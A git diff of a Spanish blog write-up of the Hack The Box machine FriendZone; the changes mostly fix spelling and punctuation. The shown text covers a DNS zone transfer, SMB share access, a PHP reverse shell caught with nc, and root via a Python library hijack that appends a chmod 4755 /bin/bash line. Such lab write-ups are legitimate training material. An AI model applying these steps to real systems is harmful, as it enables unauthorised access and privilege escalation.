@@ -1,8 +1,8 @@
 ---
 layout: single
 title: FriendZone - Hack The Box
-excerpt: "Esta maquina me gusto bastante porque los ataques de transferencia de zona son mis favoritos. Despues de destriparos la maquina voy a proceder a explicarosla.
-FriendZone es una maquina Linux con una dificultad en Hack de Box de Easy."
+excerpt: "Ésta máquina me gusto bastante, porque los ataques de transferencia de zona son mis favoritos. Después de destriparos la máquina, voy a proceder a explicarosla.
+FriendZone es una máquina Linux con una dificultad en Hack de Box de Easy."
 date: 2021-9-10
 classes: wide
 header:
@@ -27,9 +27,8 @@ tags:
 ![](/assets/images/htb-writeup-friendzone/friendzone_logo.png)
 
 # Reconocimiento
-Esta maquina me gusto bastante porque los ataques de transferencia de zona son mis favoritos. Despues de destriparos la maquina voy a a proceder a explicarosla. FriendZone es una maquina Linux con una dificultad en Hack de Box Easy
 
-Primero vamos a realizar un reconocimiento de puertos por el protocolo **TCP**, y el output vamos a meterlo en el archivo `allPorts`, por si acaso se nos olvida tener siempre la informacion apuntada.
+Primero, vamos a realizar un reconocimiento de puertos por el protocolo **TCP**, y el output vamos a meterlo en el archivo `allPorts`, por si acaso se nos olvida, tener siempre la información apuntada.
 
 ```bash
 
@@ -62,7 +61,7 @@ PORT    STATE SERVICE
 
 ```
 
-Despues de esto extraemos los puertos con la utilidad que tengo previamente definida en la `.zshrc`. Dicha herramienta esta creada por s4vitar.
+Después de esto, extraeremos los puertos, con la utilidad que tengo previamente definida en la `.zshrc`. Dicha herramienta esta creada por s4vitar.
 
 
 ```bash
@@ -139,7 +138,7 @@ Host script results:
 |_  start_date: N/A
 
 ```
-Antes que nada vamos a ver que nos dice el `whatweb` para saber que es ese puerto 80 y 443 que estan abiertos
+Antes que nada vamos a ver que nos dice el `whatweb` para saber que son esos puertos 80 y 443 que estan abiertos
 
 ```bash
 h3g0c1v@kali:~/htb/friendzone$ whatweb http://10.10.10.123
@@ -178,7 +177,7 @@ Cuando entramos en el dominio vemos lo siguiente.
 
 ![](/assets/images/htb-writeup-friendzone/good.png)
 
-Como veo nos estan troleando un poquito ahora van a ver.
+Como veo nos estan troleando un poquito, ahora van a ver.
 
 He visto un dominio, entonces se me ocurre hacer un **ataque de transferencia de zona** con al utilidad **dig** utilizando el parametro axfr
 
@@ -223,13 +222,15 @@ Ahora si que se pone un poco mas interesante. Descubrimos nuevos dominios, los c
 ```
 
 Me huele muy bien ese administrator1.friendzone.red. asi que lo vamos a abrir.
-Nos encontramos con un **login**, asi que abra que buscar credenciales validas.
+Nos encontramos con un **login**, asi que habrá que buscar credenciales válidas.
 
 ![](/assets/images/htb-writeup-friendzone/login.png)
 
 # Samba
 
-Bien, vamos a probar con Samba. Primero vamos a ver los recursos compartidos a nivel de red
+Bien, vamos a probar con Samba. 
+
+Primero vamos a ver los recursos compartidos a nivel de red
 
 ```bash
 h3g0c1v@kali:~/htb/friendzone$ smbclient -L 10.10.10.123 -N
@@ -244,7 +245,7 @@ h3g0c1v@kali:~/htb/friendzone$ smbclient -L 10.10.10.123 -N
 SMB1 disabled -- no workgroup available
 
 ```
-Y bueno vemos que hay unos cuantos pero tenemos que saber cuales son los que nos podemos meter, asi que vamos a ver los permisos que tiene cada uno
+Y bueno vemos que hay unos cuantos, pero tenemos que saber cuales son los permisos que tenemos en cada uno utilizando **smbmap**.
 
 ```bash
 
@@ -260,9 +261,9 @@ h3g0c1v@kali:~/htb/friendzone$ smbmap -H 10.10.10.123
 
 
 ```
-Vemos que en Files la ruta en la que esta almacenado los archivos es `/etc/Files`, entonces intuyo que los demas recursos seran igual.
+Vemos que en `Files` la ruta en la que esta almacenado los archivos es `/etc/Files`, entonces intuyo que los demas recursos seran igual.
 
-Vale vemos que a los recursos compartidos **general** y **Development** podemos entrar asi que vamos a ver que tienen.
+En los recursos compartidos **general** y **Development** podemos entrar asi que vamos a ver que tienen.
 
 ```bash
 
@@ -279,7 +280,7 @@ smb: \> ls
 
 ```
 
-Y vemos que en el recurso **Development** no hay nada pero en **general** nos encontramos con un archivo llamado **creds** asi que vamos a extraerlo a nuestro equipo a ver que es.
+Y vemos que en el recurso **Development** no hay nada, pero en **general** nos encontramos con un archivo llamado `creds` , asi que vamos a extraerlo a nuestro equipo a ver que es.
 
 ```bash
 
@@ -295,19 +296,19 @@ h3g0c1v@kali:~/htb/friendzone$ cat creds.txt
 
 ```
 
-¡Genial! Hemos encontrado estas credenciales, vamos a ver si son validas para el login encontrado anteriormente.
+¡Genial! Hemos encontrado estas credenciales, vamos a ver si son válidas para el **login** encontrado anteriormente.
 
 ![](/assets/images/htb-writeup-friendzone/dashboard.png)
 
-¡Y si! Han sido validas las credenciales y nos aparece una pantalla en la que nos dice que visitemos `/dashboard.php` asi que le haremos caso.
+¡Y sí! Han sido válidas las credenciales y nos aparece una pantalla en la que nos dice que visitemos `/dashboard.php` asi que le haremos caso.
 ![](/assets/images/htb-writeup-friendzone/timeout.png)
 
-Vemos que hay un comando que podemos ejecutar en la web, por lo que yo le seguire haciendo caso.
+Vemos que hay un comando que podemos ejecutar en la web, así que vamos a ver.
 ![](/assets/images/htb-writeup-friendzone/haha.png)
 
-Muy bien parece que se nos siguen riendo, pero no pasa nada que ya veran. 
+Muy bien, parece que se siguen riendo de nosotros, pero no pasa nada que ya veran. 
 
-Probamos distintas inyecciones de comandos en la url de la pagina pero no funcionan asi que lo unico que creo que puede funcionar es una revershell en el recurso compartido *Development*, que recordemos que se tenia permisos de **lectura** y **escritura**.
+Probamos distintas inyecciones de comandos en la url de la pagina, pero no funcionan así que lo único que creo que puede funcionar es una revershell en el recurso compartido **Development** , que recordemos que tenía permisos de **lectura** y **escritura**.
 
 ```php
 <?php
@@ -316,7 +317,7 @@ Probamos distintas inyecciones de comandos en la url de la pagina pero no funcio
 
 ```
 
-Perfecto, una vez metido nuestro archivo en el recurso compartido `//10.10.10.123/Development` procedemos a intentar **ejecutarlo**
+Perfecto, una vez metido nuestro archivo en el recurso compartido `//10.10.10.123/Development` , procedemos a intentar ejecutarlo.
 
 ```bash
 
@@ -334,13 +335,13 @@ smb: \> dir
 
 ```
 
-# Ganamos Acceso a la Maquina
+# Ganamos Acceso a la Máquina
 
-Ahora nos dirijimos a la url en la que se encuentra nuestro archivo malicioso poniendonos en escucha por el puerto `443` para conseguir el acceso a la maquina.
+Ahora nos dirijimos a la url en la que se encuentra nuestro archivo malicioso, poniendonos en escucha por el puerto `443` para conseguir el acceso a la máquina.
 
 ![](/assets/images/htb-writeup-friendzone/acceso.png)
 
-Y genial!! Ya estamos dentro de la maquina victima ahora podemos visualizar la **flag** `user.txt`
+¡¡Y genial!! Ya estamos dentro de la máquina víctima. Ahora podemos visualizar la `user.txt`.
 
 ```bash
 h3g0c1v@kali:~/htb/friendzone$ nc -nlvp 443
@@ -351,7 +352,7 @@ bash: no job control in this shell
 
 ```
 
-Primero hacemos un tratamiento de la tty para poder navegar mejor por la terminal y le indicamos como tipo de terminal una xterm
+Pero, primero hacemos un tratamiento de la **tty** , para poder navegar mejor por la terminal y le indicamos como tipo de terminal una **xterm**
 
 ```bash
 www-data@FriendZone:/home$ script /dev/null -c bash
@@ -368,7 +369,7 @@ Terminal type? xterm
 
 ```
 
-Ahora exportamos la variable **TERM** y la variable **SHELL**
+Exportamos la variable **TERM** y la variable **SHELL**
 
 
 ```bash
@@ -379,7 +380,7 @@ www-data@FriendZone:/home$ export SHELL=bash
 
 # Visualizamos la user.txt
 
-Muy bien ahora que tenemos una terminal totalmente interactiva, nos dirijimos al directorio `/home/friend/` procedemos a visualizar la **flag** del **user**
+Y muy bien, ahora que tenemos una terminal totalmente interactiva, nos dirijimos al directorio `/home/friend/` y visualizaremos la **flag** del **user**.
 
 ```bash
 www-data@FriendZone:/$ cd /home/friend/
@@ -392,7 +393,7 @@ a9ed20acecd6c5b6b52f474e15ae9a11
 
 # Privilate Escalation
 
-Ahora que tenemos la **flag** del **user** procederemos a escalar privilegios, para ello nos crearemos una script en bash para poder ver si hay alguna tarea **CRON** que nos podamos aprovechar.
+Ahora que tenemos la **flag** del **user** , nos toca escalar privilegios para poder ver la **flag** de **root** . Y para ello nos crearemos un **script en bash** , y ver si hay alguna tarea **CRON** que nos podamos aprovechar.
 
 ```bash
 #!/bin/bash
@@ -414,7 +415,7 @@ done
 
 ```
 
-Le damos los permisos necesarios para su ejecucion y vemos que aparece una tarea **CRON** interesante.
+Le damos los permisos necesarios para su ejecución y vemos que aparece una tarea **CRON** interesante.
 
 ```bash
 www-data@FriendZone:/tmp$ ./procmon.sh 
@@ -426,7 +427,8 @@ www-data@FriendZone:/tmp$ ./procmon.sh
 < /usr/bin/python /opt/server_admin/reporter.py
 
 ```
-Vamos a ver que contiene esa tarea **CRON**
+
+Veamos que contiene.
 
 ```python
 www-data@FriendZone:/tmp$ cat /opt/server_admin/reporter.py
@@ -449,15 +451,17 @@ print "[+] Trying to send email to %s"%to_address
 
 ```
 
-Muy bien ahora se me ocurre viendo que busca ejecutar el **comando** `os` a nivel de sistema puedo probar a realizar un `Library Hijacking`.
-Entonces editaremos el archivo `os.py` que se encuentra en la ruta `/usr/lib/python2.7/os.py` y añadiremos al final lo siguiente.
+Se me ocurre viendo que busca ejecutar el comando `os` a nivel de sistema, puedo probar a realizar un `Library Hijacking`.
+
+Entonces editaremos el archivo `os.py` , que se encuentra en la ruta absoluta `/usr/lib/python2.7/os.py` , y añadiremos al final lo siguiente.
 
 ```bash
+
 system("chmod 4755 /bin/bash")
 
 ```
 
-Ahora esperaremos hasta que la tarea `CRON` se ejecute y nos ponga el permiso **SUID** a la `/bin/bash`.
+Ahora esperaremos hasta que la tarea **CRON** se ejecute , y nos ponga el permiso **SUID** a la `/bin/bash`.
 
 ```bash
 www-data@FriendZone:/tmp$ ls -l /bin/bash 
@@ -465,7 +469,7 @@ www-data@FriendZone:/tmp$ ls -l /bin/bash
 
 ```
 
-Perfecto se ha ejecutado la tarea `CRON` y nos ha funcionado nuestro comando. Ahora ejecutamos el comando `bash -p` para obtener el root.
+Perfecto se ha ejecutado la tarea **CRON** y nos ha funcionado nuestro comando. Ahora ejecutaremos el comando `bash -p` para obtener el **root** .
 
 ```bash
 www-data@FriendZone:/tmp$ bash -p
@@ -474,8 +478,8 @@ root
 
 ```
 
-Y genial! Hemos **comprometido** la maquina y **escalado privilegios**.
-Ahora podemos ir al directorio `/root` y visualizar la **flag** de **root**
+Y genial! Hemos **comprometido** la máquina, y **escalado privilegios**.
+Ahora podemos ir al directorio `/root` y visualizar la **flag** de **root** .
 
 ```bash
 bash-4.4# cat root.txt 
